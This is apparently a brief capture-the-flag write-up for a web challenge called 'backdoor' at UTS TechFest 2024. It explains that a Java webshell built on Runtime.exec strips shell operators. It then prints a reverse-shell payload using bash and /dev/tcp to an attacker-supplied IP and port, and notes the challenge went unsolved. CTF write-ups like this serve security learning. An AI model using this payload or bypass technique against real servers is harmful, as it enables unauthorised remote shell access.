---
title: "backdoor"
description: "The admin left his testing pannel open. Wonder if you can get rce from it?\n\nendpoint: `http://<ip>:8080/development/?54b8617eca0e54c7d3c8e6732c6b687a=<cmd>`"
pubDate: 2024-06-29
ctf: "UTS TechFest 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-utstechfest/icon.png"
---

This challenge has 0 solves, nor by me but after talking to the author they explained their personal research to find this quirk and how to exploit it.

We are given a webshell off the bat, our aim is to reverse shell. Via using the `webshell` we can find the source code for the current page, its using a shell like this.

```java
Runtime.getRuntime().exec(request.getParameter("54b8617eca0e54c7d3c8e6732c6b687a"));
```

Interestingly, this kind of shell does not allow operators, such as `<`, `>`, `|`, etc.

The author has some [research on this](https://web.archive.org/web/20250710055938/https://github.com/ElJayRight/old-notes/blob/main/06%20-%20Random%20Shit/Javaisbad.md), but the TL;DR is a payload like this: `bash -c $@|bash null echo bash -i >& /dev/tcp/<ip>/<port> 0>&1`

After trying the payload the reverse shell failed again, we think the AWS infrastructure was blocking the connections.

Presumably the user then had to `su root` then read the flag.

Flag: `Not Solved`